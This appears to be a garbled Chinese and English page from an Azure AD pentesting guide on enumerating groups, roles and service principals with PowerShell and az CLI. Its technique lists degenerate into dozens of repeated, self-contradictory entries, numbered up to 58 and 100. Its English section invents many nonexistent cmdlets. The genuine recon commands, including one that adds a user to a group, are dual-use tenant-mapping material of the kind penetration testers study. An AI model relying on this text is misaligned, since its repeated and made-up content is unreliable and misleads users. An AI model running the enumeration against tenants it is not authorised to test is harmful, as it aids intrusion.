攻击者可以注册一个应用程序，以获取对 Azure AD 的访问权限。这可以通过 Azure 门户、Azure CLI 或 Azure AD Graph API 来完成。

### 2. OAuth 2.0 授权代码流

攻击者可以利用 OAuth 2.0 授权代码流来获取用户的访问令牌。这可以通过伪造授权请求、重定向 URI 和访问令牌窃取等方式来实现。

### 3. 跨站点脚本（XSS）

攻击者可以通过在 Azure AD 登录页面注入恶意脚本来实施跨站点脚本攻击。这可以导致用户的凭据被窃取或会话劫持。

### 4. 密码喷射

攻击者可以使用密码喷射技术来尝试猜测用户的密码。这可以通过自动化工具或脚本来实现。

### 5. 暴力破解

攻击者可以使用暴力破解技术来尝试猜测用户的密码。这可以通过自动化工具或脚本来实现。

### 6. 身份验证漏洞

攻击者可以利用身份验证漏洞来绕过身份验证机制，获取对 Azure AD 的访问权限。这可以通过伪造身份验证请求、绕过多因素身份验证或利用身份验证协议的弱点来实现。

### 7. 令牌窃取

攻击者可以通过窃取用户的访问令牌来获取对 Azure AD 的访问权限。这可以通过拦截网络流量、使用恶意软件或利用操作系统的漏洞来实现。

### 8. 令牌续订

攻击者可以利用令牌续订功能来延长访问令牌的有效期。这可以通过修改令牌的过期时间或使用刷新令牌来实现。

### 9. 令牌篡改

攻击者可以篡改用户的访问令牌，以获取对 Azure AD 的访问权限。这可以通过修改令牌的内容或签名来实现。

### 10. 令牌泄露

攻击者可以通过泄露访问令牌来获取对 Azure AD 的访问权限。这可以通过在代码、配置文件或日志中不正确地处理访问令牌来实现。

### 11. 令牌刷新

攻击者可以利用令牌刷新功能来获取新的访问令牌。这可以通过使用刷新令牌或伪造刷新令牌来实现。

### 12. 令牌撤销

攻击者可以利用令牌撤销功能来撤销访问令牌的有效性。这可以通过使用撤销令牌或伪造撤销令牌来实现。

### 13. 令牌劫持

攻击者可以劫持用户的访问令牌，以获取对 Azure AD 的访问权限。这可以通过拦截网络流量、使用恶意软件或利用操作系统的漏洞来实现。

### 14. 令牌伪造

攻击者可以伪造访问令牌，以获取对 Azure AD 的访问权限。这可以通过伪造令牌的内容或签名来实现。

### 15. 令牌绑定

攻击者可以利用令牌绑定功能来限制访问令牌的使用范围。这可以通过将访问令牌与特定设备、IP 地址或用户绑定来实现。

### 16. 令牌验证

攻击者可以利用令牌验证功能来验证访问令牌的有效性。这可以通过伪造令牌的签名或篡改令牌的内容来实现。

### 17. 令牌过期

攻击者可以利用令牌过期功能来限制访问令牌的有效期。这可以通过修改令牌的过期时间或使用刷新令牌来实现。

### 18. 令牌更新

攻击者可以利用令牌更新功能来更新访问令牌的内容。这可以通过修改令牌的内容或签名来实现。

### 19. 令牌撤销列表

攻击者可以利用令牌撤销列表来撤销访问令牌的有效性。这可以通过使用撤销令牌或伪造撤销令牌来实现。

### 20. 令牌刷新列表

攻击者可以利用令牌刷新列表来获取新的访问令牌。这可以通过使用刷新令牌或伪造刷新令牌来实现。

### 21. 令牌劫持列表

攻击者可以劫持用户的访问令牌，以获取对 Azure AD 的访问权限。这可以通过拦截网络流量、使用恶意软件或利用操作系统的漏洞来实现。

### 22. 令牌伪造列表

攻击者可以伪造访问令牌，以获取对 Azure AD 的访问权限。这可以通过伪造令牌的内容或签名来实现。

### 23. 令牌绑定列表

攻击者可以利用令牌绑定列表来限制访问令牌的使用范围。这可以通过将访问令牌与特定设备、IP 地址或用户绑定来实现。

### 24. 令牌验证列表

攻击者可以利用令牌验证列表来验证访问令牌的有效性。这可以通过伪造令牌的签名或篡改令牌的内容来实现。

### 25. 令牌过期列表

攻击者可以利用令牌过期列表来限制访问令牌的有效期。这可以通过修改令牌的过期时间或使用刷新令牌来实现。

### 26. 令牌更新列表

攻击者可以利用令牌更新列表来更新访问令牌的内容。这可以通过修改令牌的内容或签名来实现。

### 27. 令牌撤销列表

攻击者可以利用令牌撤销列表来撤销访问令牌的有效性。这可以通过使用撤销令牌或伪造撤销令牌来实现。

### 28. 令牌刷新列表

攻击者可以利用令牌刷新列表来获取新的访问令牌。这可以通过使用刷新令牌或伪造刷新令牌来实现。

### 29. 令牌劫持列表

攻击者可以劫持用户的访问令牌，以获取对 Azure AD 的访问权限。这可以通过拦截网络流量、使用恶意软件或利用操作系统的漏洞来实现。

### 30. 令牌伪造列表

攻击者可以伪造访问令牌，以获取对 Azure AD 的访问权限。这可以通过伪造令牌的内容或签名来实现。

### 31. 令牌绑定列表

攻击者可以利用令牌绑定列表来限制访问令牌的使用范围。这可以通过将访问令牌与特定设备、IP 地址或用户绑定来实现。

### 32. 令牌验证列表

攻击者可以利用令牌验证列表来验证访问令牌的有效性。这可以通过伪造令牌的签名或篡改令牌的内容来实现。

### 33. 令牌过期列表

攻击者可以利用令牌过期列表来限制访问令牌的有效期。这可以通过修改令牌的过期时间或使用刷新令牌来实现。

### 34. 令牌更新列表

攻击者可以利用令牌更新列表来更新访问令牌的内容。这可以通过修改令牌的内容或签名来实现。

### 35. 令牌撤销列表

攻击者可以利用令牌撤销列表来撤销访问令牌的有效性。这可以通过使用撤销令牌或伪造撤销令牌来实现。

### 36. 令牌刷新列表

攻击者可以利用令牌刷新列表来获取新的访问令牌。这可以通过使用刷新令牌或伪造刷新令牌来实现。

### 37. 令牌劫持列表

攻击者可以劫持用户的访问令牌，以获取对 Azure AD 的访问权限。这可以通过拦截网络流量、使用恶意软件或利用操作系统的漏洞来实现。

### 38. 令牌伪造列表

攻击者可以伪造访问令牌，以获取对 Azure AD 的访问权限。这可以通过伪造令牌的内容或签名来实现。

### 39. 令牌绑定列表

攻击者可以利用令牌绑定列表来限制访问令牌的使用范围。这可以通过将访问令牌与特定设备、IP 地址或用户绑定来实现。

### 40. 令牌验证列表

攻击者可以利用令牌验证列表来验证访问令牌的有效性。这可以通过伪造令牌的签名或篡改令牌的内容来实现。

### 41. 令牌过期列表

攻击者可以利用令牌过期列表来限制访问令牌的有效期。这可以通过修改令牌的过期时间或使用刷新令牌来实现。

### 42. 令牌更新列表

攻击者可以利用令牌更新列表来更新访问令牌的内容。这可以通过修改令牌的内容或签名来实现。

### 43. 令牌撤销列表

攻击者可以利用令牌撤销列表来撤销访问令牌的有效性。这可以通过使用撤销令牌或伪造撤销令牌来实现。

### 44. 令牌刷新列表

攻击者可以利用令牌刷新列表来获取新的访问令牌。这可以通过使用刷新令牌或伪造刷新令牌来实现。

### 45. 令牌劫持列表

攻击者可以劫持用户的访问令牌，以获取对 Azure AD 的访问权限。这可以通过拦截网络流量、使用恶意软件或利用操作系统的漏洞来实现。

### 46. 令牌伪造列表

攻击者可以伪造访问令牌，以获取对 Azure AD 的访问权限。这可以通过伪造令牌的内容或签名来实现。

### 47. 令牌绑定列表

攻击者可以利用令牌绑定列表来限制访问令牌的使用范围。这可以通过将访问令牌与特定设备、IP 地址或用户绑定来实现。

### 48. 令牌验证列表

攻击者可以利用令牌验证列表来验证访问令牌的有效性。这可以通过伪造令牌的签名或篡改令牌的内容来实现。

### 49. 令牌过期列表

攻击者可以利用令牌过期列表来限制访问令牌的有效期。这可以通过修改令牌的过期时间或使用刷新令牌来实现。

### 50. 令牌更新列表

攻击者可以利用令牌更新列表来更新访问令牌的内容。这可以通过修改令牌的内容或签名来实现。

### 51. 令牌撤销列表

攻击者可以利用令牌撤销列表来撤销访问令牌的有效性。这可以通过使用撤销令牌或伪造撤销令牌来实现。

### 52. 令牌刷新列表

攻击者可以利用令牌刷新列表来获取新的访问令牌。这可以通过使用刷新令牌或伪造刷新令牌来实现。

### 53. 令牌劫持列表

攻击者可以劫持用户的访问令牌，以获取对 Azure AD 的访问权限。这可以通过拦截网络流量、使用恶意软件或利用操作系统的漏洞来实现。

### 54. 令牌伪造列表

攻击者可以伪造访问令牌，以获取对 Azure AD 的访问权限。这可以通过伪造令牌的内容或签名来实现。

### 55. 令牌绑定列表

攻击者可以利用令牌绑定列表来限制访问令牌的使用范围。这可以通过将访问令牌与特定设备、IP 地址或用户绑定来实现。

### 56. 令牌验证列表

攻击者可以利用令牌验证列表来验证访问令牌的有效性。这可以通过伪造令牌的签名或篡改令牌的内容来实现。

### 57. 令牌过期列表

攻击者可以利用令牌过期列表来限制访问令牌的有效期。这可以通过修改令牌的过期时间或使用刷新令牌来实现。

### 58. 令牌更新列表

攻击者可以利用令牌更新列表来更新访问令牌的内容。这可以通过修改令
```powershell
# Enumerate Groups
Get-AzureADGroup -All $true
# Get info of 1 group
Get-AzADGroup -DisplayName <resource_group_name> | fl
# Get "admin" groups
Get-AzureADGroup -SearchString "admin" | fl #Groups starting by "admin"
Get-AzureADGroup -All $true |?{$_.Displayname -match "admin"} #Groups with the word "admin"
# Get groups allowing dynamic membership
Get-AzureADMSGroup | ?{$_.GroupTypes -eq 'DynamicMembership'}
# All groups that are from Azure AD
Get-AzureADGroup -All $true | ?{$_.OnPremisesSecurityIdentifier -eq $null}
# All groups that are synced from on-prem (note that security groups are not synced)
Get-AzureADGroup -All $true | ?{$_.OnPremisesSecurityIdentifier -ne $null}
# Get members of a group
Get-AzureADGroupMember -ObjectId <group_id>
# Get roles of group
Get-AzureADMSGroup -SearchString "Contoso_Helpdesk_Administrators" #Get group id
Get-AzureADMSRoleAssignment -Filter "principalId eq '69584002-b4d1-4055-9c94-320542efd653'"
# Get Administrative Units of a group
$groupObj = Get-AzureADGroup -Filter "displayname eq 'TestGroup'"
Get-AzureADMSAdministrativeUnit | where { Get-AzureADMSAdministrativeUnitMember -Id $_.Id | where {$_.Id -eq $groupObj.ObjectId} }
```
{% tab title="Az PowerShell" %}

Azure Active Directory (Azure AD) 是 Azure 中的身份验证和访问管理服务。它允许组织管理用户、组和应用程序，并控制对 Azure 资源的访问权限。

以下是一些常见的 Azure AD PowerShell 命令：

- `Connect-AzureAD`：连接到 Azure AD。
- `Get-AzureADUser`：获取 Azure AD 中的用户。
- `Get-AzureADGroup`：获取 Azure AD 中的组。
- `Get-AzureADApplication`：获取 Azure AD 中的应用程序。
- `New-AzureADUser`：创建新的 Azure AD 用户。
- `New-AzureADGroup`：创建新的 Azure AD 组。
- `New-AzureADApplication`：创建新的 Azure AD 应用程序。
- `Set-AzureADUser`：更新 Azure AD 用户的属性。
- `Set-AzureADGroup`：更新 Azure AD 组的属性。
- `Set-AzureADApplication`：更新 Azure AD 应用程序的属性。
- `Remove-AzureADUser`：删除 Azure AD 用户。
- `Remove-AzureADGroup`：删除 Azure AD 组。
- `Remove-AzureADApplication`：删除 Azure AD 应用程序。

使用这些命令，您可以执行各种 Azure AD 相关的操作，如创建、更新和删除用户、组和应用程序。

{% endtab %}
```powershell
# Get all groups
Get-AzADGroup
# Get details of a group
Get-AzADGroup -ObjectId <id>
# Search group by string
Get-AzADGroup -SearchString "admin" | fl * #Search at the beginnig of DisplayName
Get-AzADGroup |?{$_.Displayname -match "admin"}
# Get members of group
Get-AzADGroupMember -GroupDisplayName <resource_group_name>
# Get roles of group
Get-AzRoleAssignment -ResourceGroupName <resource_group_name>
```
{% endtab %}
{% endtabs %}

#### 将用户添加到组中

组的所有者可以将新用户添加到组中

{% code overflow="wrap" %}
```powershell
Add-AzureADGroupMember -ObjectId <group_id> -RefObjectId <user_id> -Verbose
```
{% endcode %}

### 服务主体

{% hint style="info" %}
请注意，PowerShell术语中的**服务主体**在Azure门户（Web）中被称为**企业应用程序**。
{% endhint %}

{% tabs %}
{% tab title="az cli" %}
```bash
# Get Service Principals
az ad sp list --all
az ad sp list --all --query "[].[displayName]" -o table
# Get details of one SP
az ad sp show --id 00000000-0000-0000-0000-000000000000
# Search SP by string
az ad sp list --all --query "[?contains(displayName,'app')].displayName"
# Get owner of service principal
az ad sp owner list --id <id> --query "[].[displayName]" -o table
# Get service principals owned by the current user
az ad sp list --show-mine
# List apps that have password credentials
az ad sp list --all --query "[?passwordCredentials != null].displayName"
# List apps that have key credentials (use of certificate authentication)
az ad sp list -all --query "[?keyCredentials != null].displayName"
```
{% endtab %}

{% tab title="Azure AD" %}Azure AD（Azure Active Directory）是Azure云平台上的身份验证和访问管理服务。它允许组织集中管理用户身份和访问权限，并提供单点登录和多因素身份验证等功能。

## Azure AD的安全问题

### 1. 用户密码策略

- 密码复杂性要求：密码是否需要包含特殊字符、数字和大写字母等。
- 密码过期策略：密码是否需要定期更改。
- 密码重用策略：是否允许用户在一段时间内重复使用之前的密码。

### 2. 多因素身份验证

- 是否启用了多因素身份验证来增加用户登录的安全性。

### 3. 权限分配

- 是否存在过多的管理员账户。
- 是否存在未使用的管理员账户。
- 是否存在权限过大的用户账户。

### 4. 安全日志

- 是否启用了Azure AD的安全日志功能。
- 是否监控并分析安全日志以检测潜在的安全事件。

### 5. 应用程序集成

- 是否存在未经授权的应用程序集成。
- 是否存在已停用但仍然具有访问权限的应用程序。

### 6. 密钥和证书管理

- 是否存在过期或弱密钥和证书。
- 是否存在未加密的密钥和证书。

### 7. 身份验证协议

- 是否使用了安全的身份验证协议，如SAML、OAuth等。

### 8. 身份验证绕过

- 是否存在可能绕过身份验证的漏洞。

### 9. 身份验证泄露

- 是否存在可能导致身份验证信息泄露的漏洞。

### 10. 身份验证劫持

- 是否存在可能被攻击者劫持身份验证会话的漏洞。

### 11. 身份验证终结点

- 是否存在未受保护的身份验证终结点。

### 12. 身份验证缓存

- 是否存在未正确管理的身份验证缓存。

### 13. 身份验证错误处理

- 是否存在可能导致身份验证错误信息泄露的漏洞。

### 14. 身份验证绕过

- 是否存在可能绕过身份验证的漏洞。

### 15. 身份验证终结点

- 是否存在未受保护的身份验证终结点。

### 16. 身份验证缓存

- 是否存在未正确管理的身份验证缓存。

### 17. 身份验证错误处理

- 是否存在可能导致身份验证错误信息泄露的漏洞。

### 18. 身份验证绕过

- 是否存在可能绕过身份验证的漏洞。

### 19. 身份验证终结点

- 是否存在未受保护的身份验证终结点。

### 20. 身份验证缓存

- 是否存在未正确管理的身份验证缓存。

### 21. 身份验证错误处理

- 是否存在可能导致身份验证错误信息泄露的漏洞。

### 22. 身份验证绕过

- 是否存在可能绕过身份验证的漏洞。

### 23. 身份验证终结点

- 是否存在未受保护的身份验证终结点。

### 24. 身份验证缓存

- 是否存在未正确管理的身份验证缓存。

### 25. 身份验证错误处理

- 是否存在可能导致身份验证错误信息泄露的漏洞。

### 26. 身份验证绕过

- 是否存在可能绕过身份验证的漏洞。

### 27. 身份验证终结点

- 是否存在未受保护的身份验证终结点。

### 28. 身份验证缓存

- 是否存在未正确管理的身份验证缓存。

### 29. 身份验证错误处理

- 是否存在可能导致身份验证错误信息泄露的漏洞。

### 30. 身份验证绕过

- 是否存在可能绕过身份验证的漏洞。

### 31. 身份验证终结点

- 是否存在未受保护的身份验证终结点。

### 32. 身份验证缓存

- 是否存在未正确管理的身份验证缓存。

### 33. 身份验证错误处理

- 是否存在可能导致身份验证错误信息泄露的漏洞。

### 34. 身份验证绕过

- 是否存在可能绕过身份验证的漏洞。

### 35. 身份验证终结点

- 是否存在未受保护的身份验证终结点。

### 36. 身份验证缓存

- 是否存在未正确管理的身份验证缓存。

### 37. 身份验证错误处理

- 是否存在可能导致身份验证错误信息泄露的漏洞。

### 38. 身份验证绕过

- 是否存在可能绕过身份验证的漏洞。

### 39. 身份验证终结点

- 是否存在未受保护的身份验证终结点。

### 40. 身份验证缓存

- 是否存在未正确管理的身份验证缓存。

### 41. 身份验证错误处理

- 是否存在可能导致身份验证错误信息泄露的漏洞。

### 42. 身份验证绕过

- 是否存在可能绕过身份验证的漏洞。

### 43. 身份验证终结点

- 是否存在未受保护的身份验证终结点。

### 44. 身份验证缓存

- 是否存在未正确管理的身份验证缓存。

### 45. 身份验证错误处理

- 是否存在可能导致身份验证错误信息泄露的漏洞。

### 46. 身份验证绕过

- 是否存在可能绕过身份验证的漏洞。

### 47. 身份验证终结点

- 是否存在未受保护的身份验证终结点。

### 48. 身份验证缓存

- 是否存在未正确管理的身份验证缓存。

### 49. 身份验证错误处理

- 是否存在可能导致身份验证错误信息泄露的漏洞。

### 50. 身份验证绕过

- 是否存在可能绕过身份验证的漏洞。

### 51. 身份验证终结点

- 是否存在未受保护的身份验证终结点。

### 52. 身份验证缓存

- 是否存在未正确管理的身份验证缓存。

### 53. 身份验证错误处理

- 是否存在可能导致身份验证错误信息泄露的漏洞。

### 54. 身份验证绕过

- 是否存在可能绕过身份验证的漏洞。

### 55. 身份验证终结点

- 是否存在未受保护的身份验证终结点。

### 56. 身份验证缓存

- 是否存在未正确管理的身份验证缓存。

### 57. 身份验证错误处理

- 是否存在可能导致身份验证错误信息泄露的漏洞。

### 58. 身份验证绕过

- 是否存在可能绕过身份验证的漏洞。

### 59. 身份验证终结点

- 是否存在未受保护的身份验证终结点。

### 60. 身份验证缓存

- 是否存在未正确管理的身份验证缓存。

### 61. 身份验证错误处理

- 是否存在可能导致身份验证错误信息泄露的漏洞。

### 62. 身份验证绕过

- 是否存在可能绕过身份验证的漏洞。

### 63. 身份验证终结点

- 是否存在未受保护的身份验证终结点。

### 64. 身份验证缓存

- 是否存在未正确管理的身份验证缓存。

### 65. 身份验证错误处理

- 是否存在可能导致身份验证错误信息泄露的漏洞。

### 66. 身份验证绕过

- 是否存在可能绕过身份验证的漏洞。

### 67. 身份验证终结点

- 是否存在未受保护的身份验证终结点。

### 68. 身份验证缓存

- 是否存在未正确管理的身份验证缓存。

### 69. 身份验证错误处理

- 是否存在可能导致身份验证错误信息泄露的漏洞。

### 70. 身份验证绕过

- 是否存在可能绕过身份验证的漏洞。

### 71. 身份验证终结点

- 是否存在未受保护的身份验证终结点。

### 72. 身份验证缓存

- 是否存在未正确管理的身份验证缓存。

### 73. 身份验证错误处理

- 是否存在可能导致身份验证错误信息泄露的漏洞。

### 74. 身份验证绕过

- 是否存在可能绕过身份验证的漏洞。

### 75. 身份验证终结点

- 是否存在未受保护的身份验证终结点。

### 76. 身份验证缓存

- 是否存在未正确管理的身份验证缓存。

### 77. 身份验证错误处理

- 是否存在可能导致身份验证错误信息泄露的漏洞。

### 78. 身份验证绕过

- 是否存在可能绕过身份验证的漏洞。

### 79. 身份验证终结点

- 是否存在未受保护的身份验证终结点。

### 80. 身份验证缓存

- 是否存在未正确管理的身份验证缓存。

### 81. 身份验证错误处理

- 是否存在可能导致身份验证错误信息泄露的漏洞。

### 82. 身份验证绕过

- 是否存在可能绕过身份验证的漏洞。

### 83. 身份验证终结点

- 是否存在未受保护的身份验证终结点。

### 84. 身份验证缓存

- 是否存在未正确管理的身份验证缓存。

### 85. 身份验证错误处理

- 是否存在可能导致身份验证错误信息泄露的漏洞。

### 86. 身份验证绕过

- 是否存在可能绕过身份验证的漏洞。

### 87. 身份验证终结点

- 是否存在未受保护的身份验证终结点。

### 88. 身份验证缓存

- 是否存在未正确管理的身份验证缓存。

### 89. 身份验证错误处理

- 是否存在可能导致身份验证错误信息泄露的漏洞。

### 90. 身份验证绕过

- 是否存在可能绕过身份验证的漏洞。

### 91. 身份验证终结点

- 是否存在未受保护的身份验证终结点。

### 92. 身份验证缓存

- 是否存在未正确管理的身份验证缓存。

### 93. 身份验证错误处理

- 是否存在可能导致身份验证错误信息泄露的漏洞。

### 94. 身份验证绕过

- 是否存在可能绕过身份验证的漏洞。

### 95. 身份验证终结点

- 是否存在未受保护的身份验证终结点。

### 96. 身份验证缓存

- 是否存在未正确管理的身份验证缓存。

### 97. 身份验证错误处理

- 是否存在可能导致身份验证错误信息泄露的漏洞。

### 98. 身份验证绕过

- 是否存在可能绕过身份验证的漏洞。

### 99. 身份验证终结点

- 是否存在未受保护的身份验证终结点。

### 100. 身份验证缓存

- 是否存在未正确管理的身份验证缓存。{% endtab %}
```powershell
# Get Service Principals
Get-AzureADServicePrincipal -All $true
# Get details about a SP
Get-AzureADServicePrincipal -ObjectId <id> | fl *
# Get SP by string name or Id
Get-AzureADServicePrincipal -All $true | ?{$_.DisplayName -match "app"} | fl
Get-AzureADServicePrincipal -All $true | ?{$_.AppId -match "103947652-1234-5834-103846517389"}
# Get owner of SP
Get-AzureADServicePrincipal -ObjectId <id> | Get-AzureADServicePrincipalOwner |fl *
# Get objects owned by a SP
Get-AzureADServicePrincipal -ObjectId <id> | Get-AzureADServicePrincipalOwnedObject
# Get objects created by a SP
Get-AzureADServicePrincipal -ObjectId <id> | Get-AzureADServicePrincipalCreatedObject
# Get groups where the SP is a member
Get-AzureADServicePrincipal | Get-AzureADServicePrincipalMembership
Get-AzureADServicePrincipal -ObjectId <id> | Get-AzureADServicePrincipalMembership |fl *
```
{% tab title="Az PowerShell" %}

## Az PowerShell

### Azure AD

#### Enumerate Azure AD Users

To enumerate Azure AD users using Az PowerShell, you can use the `Get-AzADUser` cmdlet. This cmdlet retrieves all the users in the Azure AD tenant.

```powershell
Get-AzADUser
```

#### Enumerate Azure AD Groups

To enumerate Azure AD groups using Az PowerShell, you can use the `Get-AzADGroup` cmdlet. This cmdlet retrieves all the groups in the Azure AD tenant.

```powershell
Get-AzADGroup
```

#### Enumerate Azure AD Applications

To enumerate Azure AD applications using Az PowerShell, you can use the `Get-AzADApplication` cmdlet. This cmdlet retrieves all the applications in the Azure AD tenant.

```powershell
Get-AzADApplication
```

#### Enumerate Azure AD Service Principals

To enumerate Azure AD service principals using Az PowerShell, you can use the `Get-AzADServicePrincipal` cmdlet. This cmdlet retrieves all the service principals in the Azure AD tenant.

```powershell
Get-AzADServicePrincipal
```

#### Enumerate Azure AD Roles

To enumerate Azure AD roles using Az PowerShell, you can use the `Get-AzADRoleDefinition` cmdlet. This cmdlet retrieves all the role definitions in the Azure AD tenant.

```powershell
Get-AzADRoleDefinition
```

#### Enumerate Azure AD Role Assignments

To enumerate Azure AD role assignments using Az PowerShell, you can use the `Get-AzADRoleAssignment` cmdlet. This cmdlet retrieves all the role assignments in the Azure AD tenant.

```powershell
Get-AzADRoleAssignment
```

#### Enumerate Azure AD Directory Roles

To enumerate Azure AD directory roles using Az PowerShell, you can use the `Get-AzADDirectoryRole` cmdlet. This cmdlet retrieves all the directory roles in the Azure AD tenant.

```powershell
Get-AzADDirectoryRole
```

#### Enumerate Azure AD Directory Role Members

To enumerate Azure AD directory role members using Az PowerShell, you can use the `Get-AzADDirectoryRoleMember` cmdlet. This cmdlet retrieves all the members of a directory role in the Azure AD tenant.

```powershell
Get-AzADDirectoryRoleMember -ObjectId <DirectoryRoleObjectId>
```

Replace `<DirectoryRoleObjectId>` with the object ID of the directory role you want to enumerate.

#### Enumerate Azure AD Directory Role Assignments

To enumerate Azure AD directory role assignments using Az PowerShell, you can use the `Get-AzADDirectoryRoleAssignment` cmdlet. This cmdlet retrieves all the directory role assignments in the Azure AD tenant.

```powershell
Get-AzADDirectoryRoleAssignment
```

#### Enumerate Azure AD Group Members

To enumerate Azure AD group members using Az PowerShell, you can use the `Get-AzADGroupMember` cmdlet. This cmdlet retrieves all the members of a group in the Azure AD tenant.

```powershell
Get-AzADGroupMember -ObjectId <GroupObjectId>
```

Replace `<GroupObjectId>` with the object ID of the group you want to enumerate.

#### Enumerate Azure AD Group Owners

To enumerate Azure AD group owners using Az PowerShell, you can use the `Get-AzADGroupOwner` cmdlet. This cmdlet retrieves all the owners of a group in the Azure AD tenant.

```powershell
Get-AzADGroupOwner -ObjectId <GroupObjectId>
```

Replace `<GroupObjectId>` with the object ID of the group you want to enumerate.

#### Enumerate Azure AD Group Membership

To enumerate Azure AD group membership using Az PowerShell, you can use the `Get-AzADGroupMembership` cmdlet. This cmdlet retrieves all the groups a user is a member of in the Azure AD tenant.

```powershell
Get-AzADGroupMembership -ObjectId <UserObjectId>
```

Replace `<UserObjectId>` with the object ID of the user you want to enumerate.

#### Enumerate Azure AD Group Settings

To enumerate Azure AD group settings using Az PowerShell, you can use the `Get-AzADGroupSetting` cmdlet. This cmdlet retrieves all the settings of a group in the Azure AD tenant.

```powershell
Get-AzADGroupSetting -ObjectId <GroupObjectId>
```

Replace `<GroupObjectId>` with the object ID of the group you want to enumerate.

#### Enumerate Azure AD Group External Members

To enumerate Azure AD group external members using Az PowerShell, you can use the `Get-AzADGroupExternalMember` cmdlet. This cmdlet retrieves all the external members of a group in the Azure AD tenant.

```powershell
Get-AzADGroupExternalMember -ObjectId <GroupObjectId>
```

Replace `<GroupObjectId>` with the object ID of the group you want to enumerate.

#### Enumerate Azure AD Group App Role Assignments

To enumerate Azure AD group app role assignments using Az PowerShell, you can use the `Get-AzADGroupAppRoleAssignment` cmdlet. This cmdlet retrieves all the app role assignments for a group in the Azure AD tenant.

```powershell
Get-AzADGroupAppRoleAssignment -ObjectId <GroupObjectId>
```

Replace `<GroupObjectId>` with the object ID of the group you want to enumerate.

#### Enumerate Azure AD Group Membership Claims

To enumerate Azure AD group membership claims using Az PowerShell, you can use the `Get-AzADGroupMembershipClaim` cmdlet. This cmdlet retrieves all the group membership claims for a user in the Azure AD tenant.

```powershell
Get-AzADGroupMembershipClaim -ObjectId <UserObjectId>
```

Replace `<UserObjectId>` with the object ID of the user you want to enumerate.

#### Enumerate Azure AD Group Membership Transitive

To enumerate Azure AD group membership transitive using Az PowerShell, you can use the `Get-AzADGroupMembershipTransitive` cmdlet. This cmdlet retrieves all the groups a user is a member of, including transitive group memberships, in the Azure AD tenant.

```powershell
Get-AzADGroupMembershipTransitive -ObjectId <UserObjectId>
```

Replace `<UserObjectId>` with the object ID of the user you want to enumerate.

#### Enumerate Azure AD Group Membership Transitive Claims

To enumerate Azure AD group membership transitive claims using Az PowerShell, you can use the `Get-AzADGroupMembershipTransitiveClaim` cmdlet. This cmdlet retrieves all the group membership claims for a user, including transitive group memberships, in the Azure AD tenant.

```powershell
Get-AzADGroupMembershipTransitiveClaim -ObjectId <UserObjectId>
```

Replace `<UserObjectId>` with the object ID of the user you want to enumerate.

#### Enumerate Azure AD Group Membership Transitive Recursive

To enumerate Azure AD group membership transitive recursive using Az PowerShell, you can use the `Get-AzADGroupMembershipTransitiveRecursive` cmdlet. This cmdlet retrieves all the groups a user is a member of, including transitive group memberships recursively, in the Azure AD tenant.

```powershell
Get-AzADGroupMembershipTransitiveRecursive -ObjectId <UserObjectId>
```

Replace `<UserObjectId>` with the object ID of the user you want to enumerate.

#### Enumerate Azure AD Group Membership Transitive Recursive Claims

To enumerate Azure AD group membership transitive recursive claims using Az PowerShell, you can use the `Get-AzADGroupMembershipTransitiveRecursiveClaim` cmdlet. This cmdlet retrieves all the group membership claims for a user, including transitive group memberships recursively, in the Azure AD tenant.

```powershell
Get-AzADGroupMembershipTransitiveRecursiveClaim -ObjectId <UserObjectId>
```

Replace `<UserObjectId>` with the object ID of the user you want to enumerate.

#### Enumerate Azure AD Group Membership Transitive Recursive Direct

To enumerate Azure AD group membership transitive recursive direct using Az PowerShell, you can use the `Get-AzADGroupMembershipTransitiveRecursiveDirect` cmdlet. This cmdlet retrieves all the groups a user is a direct member of, including transitive group memberships recursively, in the Azure AD tenant.

```powershell
Get-AzADGroupMembershipTransitiveRecursiveDirect -ObjectId <UserObjectId>
```

Replace `<UserObjectId>` with the object ID of the user you want to enumerate.

#### Enumerate Azure AD Group Membership Transitive Recursive Direct Claims

To enumerate Azure AD group membership transitive recursive direct claims using Az PowerShell, you can use the `Get-AzADGroupMembershipTransitiveRecursiveDirectClaim` cmdlet. This cmdlet retrieves all the group membership claims for a user, including transitive group memberships recursively, in the Azure AD tenant.

```powershell
Get-AzADGroupMembershipTransitiveRecursiveDirectClaim -ObjectId <UserObjectId>
```

Replace `<UserObjectId>` with the object ID of the user you want to enumerate.

#### Enumerate Azure AD Group Membership Transitive Recursive Direct Upn

To enumerate Azure AD group membership transitive recursive direct UPN using Az PowerShell, you can use the `Get-AzADGroupMembershipTransitiveRecursiveDirectUpn` cmdlet. This cmdlet retrieves all the groups a user is a direct member of, including transitive group memberships recursively, using the user principal name (UPN) in the Azure AD tenant.

```powershell
Get-AzADGroupMembershipTransitiveRecursiveDirectUpn -UserPrincipalName <UserPrincipalName>
```

Replace `<UserPrincipalName>` with the user principal name (UPN) of the user you want to enumerate.

#### Enumerate Azure AD Group Membership Transitive Recursive Direct Upn Claims

To enumerate Azure AD group membership transitive recursive direct UPN claims using Az PowerShell, you can use the `Get-AzADGroupMembershipTransitiveRecursiveDirectUpnClaim` cmdlet. This cmdlet retrieves all the group membership claims for a user, including transitive group memberships recursively, using the user principal name (UPN) in the Azure AD tenant.

```powershell
Get-AzADGroupMembershipTransitiveRecursiveDirectUpnClaim -UserPrincipalName <UserPrincipalName>
```

Replace `<UserPrincipalName>` with the user principal name (UPN) of the user you want to enumerate.

#### Enumerate Azure AD Group Membership Transitive Recursive Direct Upn Claims All

To enumerate Azure AD group membership transitive recursive direct UPN claims all using Az PowerShell, you can use the `Get-AzADGroupMembershipTransitiveRecursiveDirectUpnClaimAll` cmdlet. This cmdlet retrieves all the group membership claims for all users, including transitive group memberships recursively, using the user principal name (UPN) in the Azure AD tenant.

```powershell
Get-AzADGroupMembershipTransitiveRecursiveDirectUpnClaimAll
```

#### Enumerate Azure AD Group Membership Transitive Recursive Direct Upn Claims All Filter

To enumerate Azure AD group membership transitive recursive direct UPN claims all filter using Az PowerShell, you can use the `Get-AzADGroupMembershipTransitiveRecursiveDirectUpnClaimAllFilter` cmdlet. This cmdlet retrieves all the group membership claims for all users, including transitive group memberships recursively, using the user principal name (UPN) in the Azure AD tenant, filtered by a specific condition.

```powershell
Get-AzADGroupMembershipTransitiveRecursiveDirectUpnClaimAllFilter -Filter <Filter>
```

Replace `<Filter>` with the filter condition you want to apply.

#### Enumerate Azure AD Group Membership Transitive Recursive Direct Upn Claims All Filter Claims

